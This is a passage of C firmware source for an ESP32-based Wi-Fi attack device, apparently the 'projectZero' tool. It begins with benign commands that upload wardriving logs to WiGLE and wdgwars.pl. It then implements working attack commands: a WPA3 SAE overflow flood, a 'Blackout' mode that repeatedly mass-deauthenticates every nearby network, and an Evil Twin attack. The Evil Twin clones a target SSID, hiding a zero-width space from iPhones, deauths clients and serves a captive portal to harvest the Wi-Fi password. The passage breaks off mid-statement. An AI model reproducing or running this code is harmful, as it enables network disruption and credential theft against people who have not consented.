                MY_LOG_INFO(TAG, "Usage: wigle_key set <api_name> <api_token>");
                MY_LOG_INFO(TAG, "Or:    wigle_key set <api_name:api_token>");
                return 1;
            }
        } else {
            MY_LOG_INFO(TAG, "Usage: wigle_key set <api_name> <api_token>");
            MY_LOG_INFO(TAG, "Or:    wigle_key set <api_name:api_token>");
            return 0;
        }

        if (api_name[0] == '\0' || api_token[0] == '\0') {
            MY_LOG_INFO(TAG, "WiGLE API name/token must not be empty");
            return 1;
        }

        if (wigle_save_key_to_nvs(api_name, api_token)) {
            snprintf(wigle_api_name, sizeof(wigle_api_name), "%s", api_name);
            snprintf(wigle_api_token, sizeof(wigle_api_token), "%s", api_token);
            MY_LOG_INFO(TAG, "WiGLE key saved: %.4s****:%.4s****", wigle_api_name, wigle_api_token);
        } else {
            MY_LOG_INFO(TAG, "Failed to save WiGLE key to NVS");
            return 1;
        }
        return 0;
    }

    MY_LOG_INFO(TAG, "Usage: wigle_key set <api_name> <api_token> | wigle_key set <api_name:api_token> | wigle_key read");
    return 0;
}

static int cmd_wigle_upload(int argc, char **argv) {
    oled_display_update_full("> WiGLE", "  Sending files", "  api.wigle.net", "  Uploading...");

    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "WIFI NOT CONNECTED");
        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
        return 1;
    }

    if (wigle_api_name[0] == '\0' || wigle_api_token[0] == '\0') {
        MY_LOG_INFO(TAG, "NO WIGLE CREDENTIALS");
        MY_LOG_INFO(TAG, "Use 'wigle_key set <api_name> <api_token>' or /sdcard/lab/wigle.txt");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    int uploaded = 0;
    int skipped = 0;
    int failed = 0;
    bool auth_failed = false;

    // If files are passed as args, upload only those selected files.
    if (argc > 1) {
        int total_files = argc - 1;
        MY_LOG_INFO(TAG, "Uploading %d selected Wardrive file(s) to api.wigle.net...", total_files);

        for (int i = 1; i < argc; i++) {
            const char *arg = argv[i];
            char filepath[280];
            char upload_name[128];

            if (!wigle_resolve_upload_target(arg, filepath, sizeof(filepath), upload_name, sizeof(upload_name))) {
                MY_LOG_INFO(TAG, "[%d/%d] %s -> FAILED (invalid/missing file)", i, total_files, arg ? arg : "(null)");
                failed++;
                continue;
            }

            struct stat st;
            long fsize = 0;
            if (stat(filepath, &st) == 0) {
                fsize = (long)st.st_size;
            }

            int result = wigle_upload_file(filepath, upload_name);
            if (result == 0) {
                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", i, total_files, upload_name, fsize);
                uploaded++;
            } else if (result == 1) {
                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> skipped (duplicate)", i, total_files, upload_name, fsize);
                skipped++;
            } else if (result == 2) {
                MY_LOG_INFO(TAG, "NO WIGLE CREDENTIALS");
                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", i, total_files, upload_name, fsize);
                failed++;
                auth_failed = true;
                break;
            } else {
                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", i, total_files, upload_name, fsize);
                failed++;
            }

            vTaskDelay(pdMS_TO_TICKS(250));
        }

        MY_LOG_INFO(TAG, "Done: %d uploaded, %d skipped, %d failed", uploaded, skipped, failed);
        if (auth_failed) {
            return 1;
        }
        return (failed > 0) ? 1 : 0;
    }

    DIR *dir = opendir("/sdcard/lab/wardrives");
    if (dir == NULL) {
        MY_LOG_INFO(TAG, "Failed to open /sdcard/lab/wardrives directory");
        return 1;
    }

    struct dirent *entry;
    int total_files = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            continue;
        }
        if (wigle_is_upload_candidate(entry->d_name)) {
            total_files++;
        }
    }

    if (total_files == 0) {
        MY_LOG_INFO(TAG, "No Wardrive files (.log/.txt/.csv) found in /sdcard/lab/wardrives/");
        MY_LOG_INFO(TAG, "Done: 0 uploaded, 0 skipped, 0 failed");
        closedir(dir);
        return 0;
    }

    MY_LOG_INFO(TAG, "Uploading %d Wardrive file(s) to api.wigle.net...", total_files);

    rewinddir(dir);
    int current = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            continue;
        }
        if (!wigle_is_upload_candidate(entry->d_name)) {
            continue;
        }

        current++;
        char filepath[280];
        snprintf(filepath, sizeof(filepath), "/sdcard/lab/wardrives/%s", entry->d_name);

        struct stat st;
        long fsize = 0;
        if (stat(filepath, &st) == 0) {
            fsize = (long)st.st_size;
        }

        int result = wigle_upload_file(filepath, entry->d_name);
        if (result == 0) {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", current, total_files, entry->d_name, fsize);
            uploaded++;
        } else if (result == 1) {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> skipped (duplicate)", current, total_files, entry->d_name, fsize);
            skipped++;
        } else if (result == 2) {
            MY_LOG_INFO(TAG, "NO WIGLE CREDENTIALS");
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", current, total_files, entry->d_name, fsize);
            failed++;
            auth_failed = true;
            break;
        } else {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", current, total_files, entry->d_name, fsize);
            failed++;
        }

        vTaskDelay(pdMS_TO_TICKS(400));
    }

    closedir(dir);

    MY_LOG_INFO(TAG, "Done: %d uploaded, %d skipped, %d failed", uploaded, skipped, failed);
    if (auth_failed) {
        return 1;
    }
    return (failed > 0) ? 1 : 0;
}

/**
 * @brief Upload a single Wardrive file (.log/.csv) to wdgwars.pl
 *
 * @return 0 on success, 1 on duplicate/skipped, 2 on auth error, -1 on error
 */
static int wdgwars_upload_file(const char *filepath, const char *filename) {
    const size_t CHUNK_SIZE = 2048;
    const size_t HDR_BUF_SZ = 640;
    const size_t RESP_BUF_SZ = 640;
    int result = -1;
    FILE *f = NULL;
    esp_tls_t *tls = NULL;
    uint8_t *chunk_buf = NULL;
    char *http_headers = NULL;
    char *resp_buf = NULL;

    f = fopen(filepath, "rb");
    if (!f) {
        MY_LOG_INFO(TAG, "  Failed to open: %s", filepath);
        goto cleanup;
    }

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (file_size <= 0 || file_size > 16L * 1024L * 1024L) {
        MY_LOG_INFO(TAG, "  Invalid file size: %ld bytes", file_size);
        goto cleanup;
    }

    char boundary[40];
    snprintf(boundary, sizeof(boundary), "----WDGWars%lu", (unsigned long)(esp_timer_get_time() / 1000));

    const char *content_type = "text/csv";
    size_t name_len = strlen(filename);
    if (name_len >= 4 && strcasecmp(filename + name_len - 4, ".log") == 0) {
        content_type = "text/plain";
    }

    char body_start[256];
    int start_len = snprintf(body_start, sizeof(body_start),
                             "--%s\r\n"
                             "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
                             "Content-Type: %s\r\n\r\n",
                             boundary, filename, content_type);
    if (start_len <= 0 || start_len >= (int)sizeof(body_start)) {
        MY_LOG_INFO(TAG, "  Failed to build multipart header");
        goto cleanup;
    }

    char body_end[64];
    int end_len = snprintf(body_end, sizeof(body_end), "\r\n--%s--\r\n", boundary);
    if (end_len <= 0 || end_len >= (int)sizeof(body_end)) {
        MY_LOG_INFO(TAG, "  Failed to build multipart footer");
        goto cleanup;
    }

    int64_t body_total_len_64 = (int64_t)start_len + (int64_t)file_size + (int64_t)end_len;
    if (body_total_len_64 <= 0 || body_total_len_64 > INT_MAX) {
        MY_LOG_INFO(TAG, "  File too large for HTTP content-length: %ld bytes", file_size);
        goto cleanup;
    }
    int body_total_len = (int)body_total_len_64;

    http_headers = (char *)heap_caps_malloc(HDR_BUF_SZ, MALLOC_CAP_8BIT);
    resp_buf = (char *)heap_caps_malloc(RESP_BUF_SZ, MALLOC_CAP_8BIT);
    chunk_buf = (uint8_t *)heap_caps_malloc(CHUNK_SIZE, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!chunk_buf) {
        chunk_buf = (uint8_t *)heap_caps_malloc(CHUNK_SIZE, MALLOC_CAP_8BIT);
    }
    if (!http_headers || !resp_buf || !chunk_buf) {
        MY_LOG_INFO(TAG, "  Buffer allocation failed (hdr/resp/chunk)");
        goto cleanup;
    }

    int hdr_len = snprintf(http_headers, HDR_BUF_SZ,
                           "POST /api/upload-csv HTTP/1.1\r\n"
                           "Host: wdgwars.pl\r\n"
                           "X-API-Key: %s\r\n"
                           "Content-Type: multipart/form-data; boundary=%s\r\n"
                           "Content-Length: %d\r\n"
                           "User-Agent: projectZero-wdgwars\r\n"
                           "Connection: close\r\n"
                           "\r\n",
                           wdgwars_api_key, boundary, body_total_len);
    if (hdr_len <= 0 || hdr_len >= (int)HDR_BUF_SZ) {
        MY_LOG_INFO(TAG, "  Failed to build HTTP headers");
        goto cleanup;
    }

    esp_tls_cfg_t tls_cfg = {
        .crt_bundle_attach = NULL,
        .timeout_ms = 20000,
    };

    tls = esp_tls_init();
    if (!tls) {
        MY_LOG_INFO(TAG, "  TLS init failed");
        goto cleanup;
    }

    int ret = esp_tls_conn_http_new_sync(WDGWARS_URL, &tls_cfg, tls);
    if (ret < 0) {
        MY_LOG_INFO(TAG, "  TLS connection failed");
        goto cleanup;
    }

    if (wpasec_tls_write_all(tls, http_headers, hdr_len) < 0 ||
        wpasec_tls_write_all(tls, body_start, start_len) < 0) {
        MY_LOG_INFO(TAG, "  Failed to send request headers/body start");
        goto cleanup;
    }

    while (1) {
        size_t bytes_read = fread(chunk_buf, 1, CHUNK_SIZE, f);
        if (bytes_read > 0) {
            if (wpasec_tls_write_all(tls, (const char *)chunk_buf, (int)bytes_read) < 0) {
                MY_LOG_INFO(TAG, "  Failed to send file chunk");
                goto cleanup;
            }
        }
        if (bytes_read < CHUNK_SIZE) {
            if (ferror(f)) {
                MY_LOG_INFO(TAG, "  Read error while streaming file");
                goto cleanup;
            }
            break;
        }
    }

    if (wpasec_tls_write_all(tls, body_end, end_len) < 0) {
        MY_LOG_INFO(TAG, "  Failed to send multipart footer");
        goto cleanup;
    }

    memset(resp_buf, 0, RESP_BUF_SZ);
    int total_read = 0;
    while (total_read < (int)RESP_BUF_SZ - 1) {
        ret = esp_tls_conn_read(tls, resp_buf + total_read, RESP_BUF_SZ - 1 - total_read);
        if (ret <= 0) break;
        total_read += ret;
    }
    resp_buf[total_read] = '\0';

    int status = 0;
    if (total_read > 12 && strncmp(resp_buf, "HTTP/", 5) == 0) {
        const char *sp = strchr(resp_buf, ' ');
        if (sp) {
            status = atoi(sp + 1);
        }
    }

    bool duplicate = (strstr(resp_buf, "already") != NULL ||
                      strstr(resp_buf, "Already") != NULL ||
                      strstr(resp_buf, "duplicate") != NULL ||
                      strstr(resp_buf, "Duplicate") != NULL);

    if (status == 200 || status == 201 || status == 202) {
        result = duplicate ? 1 : 0;
        goto cleanup;
    }

    if (status == 401 || status == 403) {
        result = 2;
        goto cleanup;
    }
    if (status == 409) {
        result = 1;
        goto cleanup;
    }

    MY_LOG_INFO(TAG, "  HTTP error %d", status);
    result = -1;

cleanup:
    if (f) {
        fclose(f);
    }
    if (tls) {
        esp_tls_conn_destroy(tls);
    }
    if (chunk_buf) {
        free(chunk_buf);
    }
    if (http_headers) {
        free(http_headers);
    }
    if (resp_buf) {
        free(resp_buf);
    }
    return result;
}

static int cmd_wdgwars_key(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: wdgwars_key set <key> | wdgwars_key read");
        return 0;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        if (wdgwars_api_key[0] == '\0') {
            MY_LOG_INFO(TAG, "WDGWars key: not set");
            MY_LOG_INFO(TAG, "Set via: wdgwars_key set <key>");
            MY_LOG_INFO(TAG, "Or place the API key in /sdcard/lab/wdgwars.txt and reboot.");
        } else {
            MY_LOG_INFO(TAG, "WDGWars key: %.4s****", wdgwars_api_key);
        }
        return 0;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: wdgwars_key set <key>");
            return 0;
        }
        const char *key = argv[2];
        if (strlen(key) == 0 || strlen(key) >= WDGWARS_KEY_MAX_LEN) {
            MY_LOG_INFO(TAG, "Invalid key length (max %d chars)", WDGWARS_KEY_MAX_LEN - 1);
            return 1;
        }
        if (wdgwars_save_key_to_nvs(key)) {
            strncpy(wdgwars_api_key, key, sizeof(wdgwars_api_key) - 1);
            wdgwars_api_key[sizeof(wdgwars_api_key) - 1] = '\0';
            MY_LOG_INFO(TAG, "WDGWars key saved: %.4s****", wdgwars_api_key);
        } else {
            MY_LOG_INFO(TAG, "Failed to save WDGWars key to NVS");
            return 1;
        }
        return 0;
    }

    MY_LOG_INFO(TAG, "Usage: wdgwars_key set <key> | wdgwars_key read");
    return 0;
}

static int cmd_wdgwars_upload(int argc, char **argv) {
    oled_display_update_full("> WDGWars", "  Sending files", "  wdgwars.pl", "  Uploading...");

    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "WIFI NOT CONNECTED");
        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
        return 1;
    }

    if (wdgwars_api_key[0] == '\0') {
        MY_LOG_INFO(TAG, "NO WDGWARS CREDENTIALS");
        MY_LOG_INFO(TAG, "Use 'wdgwars_key set <key>' or /sdcard/lab/wdgwars.txt");
        return 1;
    }

    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }

    int uploaded = 0;
    int skipped = 0;
    int failed = 0;
    bool auth_failed = false;

    if (argc > 1) {
        int total_files = argc - 1;
        MY_LOG_INFO(TAG, "Uploading %d selected Wardrive file(s) to wdgwars.pl...", total_files);

        for (int i = 1; i < argc; i++) {
            const char *arg = argv[i];
            char filepath[280];
            char upload_name[128];

            if (!wdgwars_resolve_upload_target(arg, filepath, sizeof(filepath), upload_name, sizeof(upload_name))) {
                MY_LOG_INFO(TAG, "[%d/%d] %s -> FAILED (invalid/missing file)", i, total_files, arg ? arg : "(null)");
                failed++;
                continue;
            }

            struct stat st;
            long fsize = 0;
            if (stat(filepath, &st) == 0) {
                fsize = (long)st.st_size;
            }

            int result = wdgwars_upload_file(filepath, upload_name);
            if (result == 0) {
                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", i, total_files, upload_name, fsize);
                uploaded++;
            } else if (result == 1) {
                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> skipped", i, total_files, upload_name, fsize);
                skipped++;
            } else if (result == 2) {
                MY_LOG_INFO(TAG, "WDGWARS AUTH FAILED");
                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", i, total_files, upload_name, fsize);
                failed++;
                auth_failed = true;
                break;
            } else {
                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", i, total_files, upload_name, fsize);
                failed++;
            }

            vTaskDelay(pdMS_TO_TICKS(250));
        }

        MY_LOG_INFO(TAG, "Done: %d uploaded, %d skipped, %d failed", uploaded, skipped, failed);
        if (auth_failed) {
            return 1;
        }
        return (failed > 0) ? 1 : 0;
    }

    DIR *dir = opendir("/sdcard/lab/wardrives");
    if (dir == NULL) {
        MY_LOG_INFO(TAG, "Failed to open /sdcard/lab/wardrives directory");
        return 1;
    }

    struct dirent *entry;
    int total_files = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            continue;
        }
        if (wdgwars_is_upload_candidate(entry->d_name)) {
            total_files++;
        }
    }

    if (total_files == 0) {
        MY_LOG_INFO(TAG, "No Wardrive files (.log/.csv) found in /sdcard/lab/wardrives/");
        MY_LOG_INFO(TAG, "Done: 0 uploaded, 0 skipped, 0 failed");
        closedir(dir);
        return 0;
    }

    MY_LOG_INFO(TAG, "Uploading %d Wardrive file(s) to wdgwars.pl...", total_files);

    rewinddir(dir);
    int current = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            continue;
        }
        if (!wdgwars_is_upload_candidate(entry->d_name)) {
            continue;
        }

        current++;
        char filepath[280];
        snprintf(filepath, sizeof(filepath), "/sdcard/lab/wardrives/%s", entry->d_name);

        struct stat st;
        long fsize = 0;
        if (stat(filepath, &st) == 0) {
            fsize = (long)st.st_size;
        }

        int result = wdgwars_upload_file(filepath, entry->d_name);
        if (result == 0) {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", current, total_files, entry->d_name, fsize);
            uploaded++;
        } else if (result == 1) {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> skipped", current, total_files, entry->d_name, fsize);
            skipped++;
        } else if (result == 2) {
            MY_LOG_INFO(TAG, "WDGWARS AUTH FAILED");
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", current, total_files, entry->d_name, fsize);
            failed++;
            auth_failed = true;
            break;
        } else {
            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", current, total_files, entry->d_name, fsize);
            failed++;
        }

        vTaskDelay(pdMS_TO_TICKS(400));
    }

    closedir(dir);

    MY_LOG_INFO(TAG, "Done: %d uploaded, %d skipped, %d failed", uploaded, skipped, failed);
    if (auth_failed) {
        return 1;
    }
    return (failed > 0) ? 1 : 0;
}

// -------------------------------------------------

static int cmd_start_sae_overflow(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    oled_display_update_full("> SAE Flood",
        (g_selected_count > 0) ? (const char *)g_scan_results[g_selected_indices[0]].ssid : "  No target",
        "  WPA3 Overflow", "  Flooding...");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if SAE attack is already running
    if (sae_attack_active || sae_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "SAE overflow attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    if (g_selected_count == 1) {
        applicationState = SAE_OVERFLOW;
        int idx = g_selected_indices[0];
        const wifi_ap_record_t *ap = &g_scan_results[idx];
        
        // Set LED
        esp_err_t led_err = led_set_color(255, 0, 0);
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set LED for SAE overflow: %s", esp_err_to_name(led_err));
        }
        
        MY_LOG_INFO(TAG,"WPA3 SAE Overflow Attack");
        MY_LOG_INFO(TAG,"Target: SSID='%s' Ch=%d Auth=%d", (const char*)ap->ssid, ap->primary, ap->authmode);
        MY_LOG_INFO(TAG,"SAE attack started. Use 'stop' to stop.");
        
        // Allocate memory for ap_record to pass to task
        wifi_ap_record_t *ap_copy = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t));
        if (ap_copy == NULL) {
            MY_LOG_INFO(TAG, "Failed to allocate memory for SAE attack!");
            applicationState = IDLE;
            return 1;
        }
        memcpy(ap_copy, ap, sizeof(wifi_ap_record_t));
        
        // Start SAE attack in background task
        sae_attack_active = true;
        BaseType_t result = xTaskCreate(
            sae_attack_task,
            "sae_task",
            8192,  // Larger stack size for crypto operations
            ap_copy,
            5,     // Priority
            &sae_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create SAE overflow task!");
            free(ap_copy);
            sae_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"SAE Overflow: you need to select exactly ONE network (use select_networks).");
    }
    return 0;
}

// Blackout attack command - scans all networks every 3 minutes, sorts by channel, attacks all
static int cmd_start_blackout(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    oled_display_update_full("> Blackout Mode", "  All networks", "  Mass deauth", "  Active...");
    log_memory_info("start_blackout");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if blackout attack is already running
    if (blackout_attack_active || blackout_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Blackout attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting blackout attack - scanning all networks every 3 minutes...");
    MY_LOG_INFO(TAG, "Networks will be sorted by channel for efficient attacking.");
    MY_LOG_INFO(TAG, "Use 'stop' to stop the attack.");
    
    // Start blackout attack in background task
    blackout_attack_active = true;
    BaseType_t result = xTaskCreate(
        blackout_attack_task,
        "blackout_task",
        4096,  // Stack size
        NULL,
        5,     // Priority
        &blackout_attack_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create blackout attack task!");
        blackout_attack_active = false;
        return 1;
    }
    
    return 0;
}

static void boot_button_task(void *arg) {
    const TickType_t delay_ticks = pdMS_TO_TICKS(BOOT_BUTTON_POLL_DELAY_MS);
    const TickType_t long_press_ticks = pdMS_TO_TICKS(BOOT_BUTTON_LONG_PRESS_MS);
    bool prev_pressed = (gpio_get_level(BOOT_BUTTON_GPIO) == 0);
    TickType_t press_start_tick = prev_pressed ? xTaskGetTickCount() : 0;
    bool long_action_triggered = false;

    while (1) {
        bool pressed = (gpio_get_level(BOOT_BUTTON_GPIO) == 0);
        TickType_t now = xTaskGetTickCount();

        if (pressed) {
            if (!prev_pressed) {
                // Rising edge - start tracking the press
                press_start_tick = now;
                long_action_triggered = false;
            } else if (!long_action_triggered && (now - press_start_tick) >= long_press_ticks) {
                long_action_triggered = true;
                printf("Boot Long Pressed\n");
                fflush(stdout);
                boot_handle_action(true);
            }
        } else if (prev_pressed) {
            // Falling edge - button released
            if (!long_action_triggered) {
                printf("Boot Pressed\n");
                fflush(stdout);
                boot_handle_action(false);
            }
            long_action_triggered = false;
        }

        prev_pressed = pressed;
        vTaskDelay(delay_ticks);
    }
}

/*
0) Starts captive portal to collect password
1) Starts a stream of deauth packets sent to all target networks. 
2) When password is entered in portal, stops deauth stream and attempts to connect to a network

*/
static int cmd_start_evil_twin(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    if (!onlyDeauth) {
        char oled_target[48];
        oled_build_target_summary(oled_target, sizeof(oled_target));
        oled_display_update_full("> Evil Twin", oled_target, "  Captive portal", "  Waiting pwd..");
    }
    log_memory_info("start_evil_twin");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if attack is already running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    if (g_selected_count > 0) {
        // Set application state based on attack type
        if (onlyDeauth) {
            applicationState = DEAUTH;
        } else {
            applicationState = DEAUTH_EVIL_TWIN;
            // Reset password wrong flag for new attack
            last_password_wrong = false;
        }

        const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
        evilTwinSSID = malloc(strlen(sourceSSID) + 1); 
        if (evilTwinSSID != NULL) {
            strcpy(evilTwinSSID, sourceSSID);
        } else {
            ESP_LOGW(TAG,"Malloc error 4 SSID");
        }

        // Start portal before starting deauth attack
        if (!onlyDeauth) {
            MY_LOG_INFO(TAG,"Starting captive portal for Evil Twin attack on: %s", evilTwinSSID);
            
            // Enable AP mode (switches to APSTA) and get AP netif
            esp_netif_t *ap_netif = ensure_ap_mode();
            if (!ap_netif) {
                MY_LOG_INFO(TAG, "Failed to enable AP mode");
                applicationState = IDLE;
                return 1;
            }
            
            // Stop DHCP server to configure custom IP
            esp_netif_dhcps_stop(ap_netif);
            
            // Set static IP 172.0.0.1 for AP
            esp_netif_ip_info_t ip_info;
            ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
            ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
            ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
            
            esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
            if (ret != ESP_OK) {
                applicationState = IDLE;
                return 1;
            }
            
            // Configure AP with Evil Twin SSID
            wifi_config_t ap_config = {
                .ap = {
                    .ssid = "",
                    .ssid_len = 0,
                    .channel = target_bssid_count > 0 ? target_bssids[0].channel : 1,
                    .password = "",
                    .max_connection = 4,
                    .authmode = WIFI_AUTH_OPEN
                }
            };
            
            // Copy original SSID and add Zero Width Space (U+200B) at the end
            // This prevents iPhone from grouping original and twin networks together
            size_t ssid_len = strlen(evilTwinSSID);
            if (ssid_len + 3 <= sizeof(ap_config.ap.ssid)) {
                // Copy original SSID
                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
                // Add Zero Width Space (UTF-8: 0xE2 0x80 0x8B)
                ap_config.ap.ssid[ssid_len] = 0xE2;
                ap_config.ap.ssid[ssid_len + 1] = 0x80;
                ap_config.ap.ssid[ssid_len + 2] = 0x8B;
                ap_config.ap.ssid_len = ssid_len + 3;
            } else {
                // SSID too long, just copy without Zero Width Space
                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen(evilTwinSSID);
            }
            
            // AP mode was enabled by ensure_ap_mode(), update the configuration
            ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
            if (ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
                applicationState = IDLE;
                return 1;
            }
            
            // Start DHCP server
            ret = esp_netif_dhcps_start(ap_netif);
            if (ret != ESP_OK) {
                applicationState = IDLE;
                return 1;
            }
            
            // Wait a bit for AP to fully start
            vTaskDelay(pdMS_TO_TICKS(1000));
            
            // Configure HTTP server
            httpd_config_t config = HTTPD_DEFAULT_CONFIG();
            config.server_port = 80;
            config.max_open_sockets = 7;
            
            // Start HTTP server
            esp_err_t http_ret = httpd_start(&portal_server, &config);
            if (http_ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
                // Stop DHCP before returning
                esp_netif_dhcps_stop(ap_netif);
                applicationState = IDLE;
                return 1;
            }
            
            // Register URI handlers
            httpd_uri_t root_uri = {
                .uri = "/",
                .method = HTTP_GET,
                .handler = root_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &root_uri);
            
            httpd_uri_t root_post_uri = {
                .uri = "/",
                .method = HTTP_POST,
                .handler = root_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &root_post_uri);
            
            httpd_uri_t portal_uri = {
                .uri = "/portal",
                .method = HTTP_GET,
                .handler = portal_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &portal_uri);
            
            httpd_uri_t login_uri = {
                .uri = "/login",
                .method = HTTP_POST,
                .handler = login_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &login_uri);
            
            httpd_uri_t get_uri = {
                .uri = "/get",
                .method = HTTP_GET,
                .handler = get_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &get_uri);
            
            httpd_uri_t save_uri = {
                .uri = "/save",
                .method = HTTP_POST,
                .handler = save_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &save_uri);
            
            httpd_uri_t android_captive_uri = {
                .uri = "/generate_204",
                .method = HTTP_GET,
                .handler = android_captive_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &android_captive_uri);
            
            httpd_uri_t ios_captive_uri = {
                .uri = "/hotspot-detect.html",
                .method = HTTP_GET,
                .handler = ios_captive_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &ios_captive_uri);
            
            httpd_uri_t samsung_captive_uri = {
                .uri = "/ncsi.txt",
                .method = HTTP_GET,
                .handler = captive_detection_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &samsung_captive_uri);
            
            httpd_uri_t windows_captive_uri = {
                .uri = "/connecttest.txt",
                .method = HTTP_GET,
                .handler = captive_detection_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &windows_captive_uri);
            
            // Set portal_active flag BEFORE starting DNS task
            // (DNS task checks this flag in its loop)
            portal_active = true;
            
            // Start DNS server task
            BaseType_t dns_result = xTaskCreate(
                dns_server_task,
                "dns_server",
                4096,
                NULL,
                5,
                &dns_server_task_handle
            );
            
            if (dns_result != pdPASS) {
                MY_LOG_INFO(TAG, "Failed to create DNS server task");
                httpd_stop(portal_server);
                portal_server = NULL;
                portal_active = false;
                applicationState = IDLE;
                return 1;
            }
            
            MY_LOG_INFO(TAG, "Captive portal started successfully");
        }

        MY_LOG_INFO(TAG,"Attacking %d network(s):", g_selected_count);
        
        // Save target BSSIDs for channel monitoring
        save_target_bssids();
        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
        
        MY_LOG_INFO(TAG,"Deauth attack started. Use 'stop' to stop.");
        
        // Show selected stations info for targeted deauth
        if (selected_stations_count > 0 && applicationState == DEAUTH) {
            MY_LOG_INFO(TAG, "Targeted mode: %d station(s)", selected_stations_count);
            for (int s = 0; s < selected_stations_count; s++) {
                MY_LOG_INFO(TAG, "  -> %02X:%02X:%02X:%02X:%02X:%02X",
                           selected_stations[s].mac[0], selected_stations[s].mac[1],
